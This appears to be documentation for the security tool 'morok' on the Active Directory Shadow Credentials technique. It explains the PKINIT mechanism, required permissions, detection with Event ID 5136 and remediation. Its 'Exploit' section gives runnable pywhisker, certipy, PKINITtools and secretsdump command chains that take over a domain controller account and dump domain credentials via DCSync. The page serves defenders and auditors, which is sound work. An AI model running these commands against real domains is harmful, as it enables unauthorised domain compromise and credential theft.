# Shadow Credentials

**MITRE:** T1556.006 (Modify Authentication Process)

## How it works

Every Active Directory computer and user account can store **Key Credential Link** entries in the `msDS-KeyCredentialLink` attribute. These entries are used by Windows Hello for Business and certificate-based authentication to associate a public key with the account.

When an account has a Key Credential Link, the Kerberos protocol accepts a **PKINIT (Public Key Cryptography for Initial Authentication)** request using the corresponding private key — and issues a TGT **without requiring the account's password**.

If an attacker has **write access to `msDS-KeyCredentialLink`** on a target account, they can:

1. Generate a new key pair
2. Add the public key to the target's `msDS-KeyCredentialLink`
3. Use the private key to authenticate as the target via PKINIT
4. Obtain a TGT — **no password needed, no password change**

```
Attacker: add public key → msDS-KeyCredentialLink on DC01$
Attacker: PKINIT AS-REQ with private key
KDC:      issues TGT for DC01$
Attacker: DCSync using DC01$ TGT
```

## Why it's dangerous

- **No password change** — stealth; the target account continues to work normally
- **Persistent access** — the key credential remains until explicitly removed
- **Works on computer accounts** — targeting a DC allows DCSync
- **Evades password spray protections** — no password is involved

## Required permissions

Any of these ACEs on the target object are sufficient:

| Permission | Notes |
|------------|-------|
| `GenericAll` | Full control |
| `WriteDACL` | Modify DACL → grant self write |
| `WriteOwner` | Take ownership → grant write |
| `GenericWrite` | Write to most attributes |
| `WriteProperty (msDS-KeyCredentialLink)` | Direct write, most precise |

## High-value targets

| Target | Impact |
|--------|--------|
| Domain Controller computer object | DCSync (domain compromise) |
| Domain Admins group | Add member → Domain Admin access |
| Enterprise Admins group | Forest-wide compromise |
| Any privileged user | Compromise that account |

## Detection with morok

```bash
morok shadow -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

morok parses `nTSecurityDescriptor` (DACL) on all privileged targets and reports non-privileged principals with write-enabling ACEs.

## Exploit

```bash
# Step 1: Add a key credential to target (requires write access to msDS-KeyCredentialLink)
pywhisker -d corp.local -u attacker -p 'Password1' \
  --target 'DC01$' --action add
# Outputs: certificate.pfx + password

# Step 2: Authenticate via PKINIT and get TGT
certipy shadow auto -u attacker@corp.local -p 'Password1' -account 'DC01$'
# Outputs: dc01.ccache

# Step 3: DCSync using DC TGT
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass corp.local/DC01\$@dc01.corp.local
```

Alternatively with PKINITtools:

```bash
gettgtpkinit.py corp.local/DC01\$ \
  -cert-pfx certificate.pfx -pfx-pass 'generatedpass' dc01.ccache

export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass DC01\$@dc01.corp.local
```

## Detection (Blue Team)

- Enable **Directory Service Changes** auditing (Event ID **5136**) — logs every write to `msDS-KeyCredentialLink`
- Alert on modifications to `msDS-KeyCredentialLink` on high-value accounts (DCs, Domain Admins)
- Baseline: legitimate Key Credential Links exist only on accounts enrolled in WHfB; a new entry appearing on a DC is suspicious

## Remediation

1. Remove unnecessary write permissions on Domain Admins, Enterprise Admins, and DC objects
2. Run `morok shadow` regularly and review all write ACEs
3. Add privileged accounts to **Protected Users** group
4. Monitor `msDS-KeyCredentialLink` via SIEM (Event ID 5136)
5. Consider using **Tiered Administration Model** — separate admin accounts for Tier 0 (DC/domain-level) operations

## References

- [Elad Shamir — Shadow Credentials (original research)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [pywhisker](https://github.com/ShutdownRepo/pywhisker)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
